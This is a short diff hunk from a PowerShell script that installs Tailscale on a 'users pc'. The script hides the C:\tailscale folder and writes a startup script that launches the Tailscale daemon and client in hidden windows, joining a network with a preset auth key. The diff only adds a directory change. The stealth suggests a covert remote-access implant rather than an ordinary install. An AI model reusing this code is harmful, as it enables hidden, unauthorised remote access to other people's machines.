@@ -35,7 +35,7 @@ function installTailscale {
   Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
 
   ## Configure Tailscale on users pc
-
+  Set-Location C:\tailscale
   Write-Output "Set-Location C:\tailscale
 Start-Process -FilePath '.\tailscaled.exe' -WindowStyle Hidden
 Start-Process -FilePath '.\tailscale.exe'  -WindowStyle Hidden -ArgumentList 'up --authkey $authKey'" >> tailscale.ps1
